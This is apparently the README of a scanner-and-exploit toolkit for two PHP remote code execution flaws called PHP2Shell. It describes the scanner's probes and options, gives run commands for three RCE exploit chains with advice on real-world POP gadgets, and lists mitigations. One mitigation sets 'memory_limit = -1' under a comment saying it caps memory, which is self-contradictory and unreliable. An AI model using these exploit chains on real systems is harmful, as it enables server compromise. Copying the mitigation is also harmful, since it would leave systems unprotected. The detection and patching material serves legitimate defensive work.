# PHP2Shell

A command-line tool for detecting and exploiting **CVE-2026-109618** and **CVE-2026-109619** (PHP2Shell) in PHP applications.

## About the CVE

PHP2Shell is the collective name given to two critical **unauthenticated Remote Code Execution (RCE)** vulnerabilities in the PHP runtime. Both were discovered by researchers from Calif, OpenAI, and Wiz, and patched on October 21, 2026.

The flaws stem from PHP's memory handling when a request terminates abnormally:

- **CVE-2026-109618** (CVSS 9.8): Memory corruption during *out-of-memory* handling. PHP can be interrupted mid-request-initialization, leaving internal data structures partially initialized. Subsequent cleanup treats this invalid data as valid, enabling remote code execution before any application code runs.
- **CVE-2026-109619** (CVSS 8.1): Stale global state. A PHP worker can retain references to memory from a freed request. A later request served by the same worker accesses this stale state, enabling use-after-free, memory disclosure, and RCE with the web worker's privileges.

The highest-risk vector is **Apache with mod_php**, where exploitation was demonstrated before any application code executes. PHP-FPM, php-cgi, FrankenPHP, and LiteSpeed are also affected.

**Fixed versions:** PHP 8.2.35, 8.3.36, 8.4.27, 8.5.12.

## How the Scanner Works

The scanner sends a minimal multipart control request followed by up to three crafted multipart probes. The probes use PHP array keys nested 62 levels deep and increase from 1 MiB to 20 MiB, matching the detection logic used by Assetnote's internal scanner.

A target is reported vulnerable when the probe produces a PHP memory-exhaustion error, a differential empty HTTP 500, a PHP-FPM worker failure, or an advertised PHP version known to be unpatched. Initial 5xx responses, common request-rejection statuses, and nonempty HTTP 500 responses without the PHP fatal-error signature are not treated as crash signals.

The scanner tests `/index.php` by default. A path supplied in the URL is preserved, and `--path` or `--path-file` can test custom paths. phpMyAdmin targets are automatically retested at `/show_config_errors.php`. Redirects are not followed unless `--follow-redirects` is set.

### SAPI Modes

The default `--sapi auto` mode applies both mod_php and PHP-FPM verdict rules, matching the combined behavior of Assetnote's postmodules. Use `--sapi mod_php` or `--sapi fpm` to restrict detection to a known SAPI.

### Network Impact

Each tested path may receive a 42-byte control request and three probes totalling about 29 MiB. Probing stops as soon as the verdict is settled, and duplicate input URLs are scanned once.

## Requirements

- Python 3.9+
- h11
- tqdm

## Installation

```bash
pip install -r requirements.txt
```

## Scanner Usage

Scan a single host:

```bash
python3 scanner.py -u https://example.com
```

Scan a list of hosts:

```bash
python3 scanner.py -l hosts.txt
```

Scan with multiple threads and save results:

```bash
python3 scanner.py -l hosts.txt -t 20 -o results.json
```

Scan with custom headers:

```bash
python3 scanner.py -u https://example.com -H "Authorization: Bearer token" -H "Cookie: session=abc"
```

Scan a custom path:

```bash
python3 scanner.py -u https://example.com --path /phpinfo.php
python3 scanner.py -u https://example.com --path /index.php --path /admin.php
python3 scanner.py -u https://example.com --path-file paths.txt
```

Use only PHP-FPM verdict rules:

```bash
python3 scanner.py -u https://example.com --sapi fpm
```

## Scanner Options

```
-u, --url           Single URL to check
-l, --list          File containing hosts (one per line)
-t, --threads       Number of concurrent threads (default: 10)
--timeout           Request timeout in seconds (default: 60)
-o, --output        Output file for results (JSON)
--all-results       Save all results, not just vulnerable hosts
-k, --insecure      Disable TLS certificate verification
--follow-redirects  Follow HTTP redirects (up to 10 hops)
-H, --header        Custom header (can be used multiple times)
-v, --verbose       Show verdict reasons and response snippets
-q, --quiet         Only output vulnerable hosts
--no-color          Disable colored output
--sapi              Verdict rules: auto, mod_php, or fpm (default: auto)
--path              Custom path to test (can be used multiple times)
--path-file         File containing paths to test (one per line)
```

## Output

Results are printed to the terminal. When using `-o`, vulnerable hosts are saved to a JSON file with the verdict reason and redacted HTTP request/response evidence. Use `--all-results` to save every result, not only vulnerable hosts. Use `-q` to suppress everything except vulnerable hosts.

## Exploits

Three RCE exploits (Chains A, B, C) are included in `exploit/`:

| File | Chain | What It Does | Prerequisites |
|---|---|---|---|
| `chain_a_session_lfi.py` | A | Injects PHP code via upload filename → LFI includes session file → RCE | `session.upload_progress.enabled=On`, LFI sink, known session path |
| `chain_b_uaf_rce.php` | B | var_destroy UAF → discovers `zif_system` via `EG()` → overwrites `var_dump` handler via `/proc/self/mem` → RCE | **PHP 8.2.34-fpm only**, local exec, `/proc/self/mem` writable (privileged container). Lab PoC, not generic. |
| `chain_c_mismatch_rce.py` | C | Pollutes FPM worker `PS(serializer)` → injects serialized object via filename → `__destruct` fires on decode failure → RCE | FPM persistent workers, endpoint calling `ini_set('session.serialize_handler','php_serialize')`, **target-specific POP gadget** |

Chains D and E are available to paid subscribers.

### Chain A — Session injection + LFI → RCE

```bash
python3 exploit/chain_a_session_lfi.py \
  --target http://TARGET \
  --inject-path /index.php \
  --lfi-path /vuln.php \
  --session-path /tmp/sessions \
  --command 'id'
```

Requires an LFI sink in the target. Use `--cleanup-on` to race the default `session.upload_progress.cleanup=On` with a stalled writer.

### Chain B — var_destroy UAF → RCE (lab PoC)

⚠️ **Calibrated for PHP 8.2.34-fpm only.** Requires local PHP execution on the target and a writable `/proc/self/mem` (privileged container). Other versions (8.0/8.1/8.3/8.4/8.2.35+) fail with `symbols not found` because the `EG` offset and handler offset differ. This is **not a generic remote exploit**.

```bash
php exploit/chain_b_uaf_rce.php
```

### Chain C — Handler mismatch → __destruct → RCE

⚠️ The default gadget (`O:4:"Evil":...`) is a **placeholder** — it only works against labs that define an `Evil` class with an exploitable `__destruct`. Against real targets, pass `--gadget` with a framework-specific POP chain (Laravel `PendingBroadcast`, Symfony `TagAwareAdapter`, WordPress `WP_Object_Cache`, etc.).

```bash
python3 exploit/chain_c_mismatch_rce.py \
  --target http://TARGET \
  --pollute-path /endpoint_php_serialize \
  --upload-path /app/upload.php \
  --trigger-path /api/endpoint.php \
  --gadget 'O:...'
```

## Mitigation

The only complete fix is to **update PHP** to 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12+ and restart workers.

For environments that cannot patch immediately, PHP published temporary mitigations that reduce exposure but **do not eliminate risk**:

### For CVE-2026-109618

```ini
; Cap memory usage (php_admin_value in FPM pool or Apache)
memory_limit = -1
post_max_size = 8M   ; or 32M if uploads are required
```

### For CVE-2026-109619

```ini
; Disable upload progress and restart all workers
session.upload_progress.enabled = 0

; PHP 8.5 only: disable fatal error backtraces
fatal_error_backtraces = 0
```

> **Note:** these mitigations must be applied in `php.ini`, FPM pool config, or Apache config — not via `ini_set()` or `.user.ini`. They block only known attack paths and are not a substitute for updating.

For legacy environments (PHP 5.4–8.1, EOL), community-maintained backports are available at [Anton-Barinov/php2shell-patches](https://github.com/Anton-Barinov/php2shell-patches).

## Scanner Limitations

On specific PHP configurations, the scanner may report a false positive when its multipart probe exceeds PHP's `memory_limit`. Patched and vulnerable versions can then return the same empty HTTP 500 response.

This was reproduced on patched PHP 8.4.27 with `memory_limit` values from **2M to 32M**, and on PHP 8.3.36 at **128M** when `max_multipart_body_parts` is set to **2785 or higher**. The exact threshold may vary between builds.

When PHP does not disclose its version, the scanner cannot distinguish this safe post-patch OOM from the vulnerable pre-patch behavior. Results should therefore be verified against the installed PHP version and any vendor backports.

## Credits

The first, original discovery of php2shell is attributed to the **Calif** team, with contributions from **OpenAI** and **Wiz**. The original write-up is available at [calif.io/php2shell](https://calif.io/php2shell/).

The scanner was built by the **Assetnote Security Research Team** using logic built for Searchlight's Exposure Platform.

## License

See [LICENSE](LICENSE) for details.
